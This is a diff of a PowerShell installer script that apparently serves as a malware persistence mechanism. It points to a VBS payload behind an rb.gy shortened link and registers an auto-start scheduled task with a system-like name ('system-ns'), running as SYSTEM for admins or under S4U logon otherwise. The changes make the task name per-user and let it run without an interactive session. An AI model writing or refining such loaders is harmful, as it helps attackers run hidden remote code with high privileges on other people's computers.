@@ -12,7 +12,7 @@ if ($isAdmin) {
     $scriptVbsUrl = "https://rb.gy/3lld2p"
 }
 
-# Create the installation directory if it doesn't exist
+# Create the installation directory if it doesn’t exist
 if (-not (Test-Path $installPath)) {
     New-Item -ItemType Directory -Path $installPath -Force | Out-Null
     Write-Output "Created directory: $installPath"
@@ -54,25 +54,27 @@ if ($isAdmin) {
     }
 }
 
-# Create a scheduled task
+# Create a scheduled task with a unique name based on the current user
+$taskName = "system-ns-$env:UserName"
 $action = New-ScheduledTaskAction -Execute $scriptVbsPath
 $trigger = New-ScheduledTaskTrigger -AtStartup
 $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -DontStopOnIdleEnd
-$taskName = "system-ns"
 
+# Define the principal based on privilege level
 if ($isAdmin) {
     # Run as NT AUTHORITY\SYSTEM with highest privileges
     $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
 } else {
-    # Run as the current user with their privileges
-    $principal = New-ScheduledTaskPrincipal -UserId $env:UserName -LogonType Interactive
+    # Run as the current user with S4U logon type
+    $principal = New-ScheduledTaskPrincipal -UserId $env:UserName -LogonType S4U
 }
 
+# Register and start the scheduled task
 try {
     Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Principal $principal -Settings $settings -Force -ErrorAction Stop
     Write-Output "Scheduled task registered successfully"
     Start-ScheduledTask -TaskName $taskName -ErrorAction Stop
     Write-Output "Scheduled task started successfully"
 } catch {
-    Write-Output "Scheduled task error: $_"
+    Write-Output "Scheduled task error: $($_.Exception.Message)"
 }
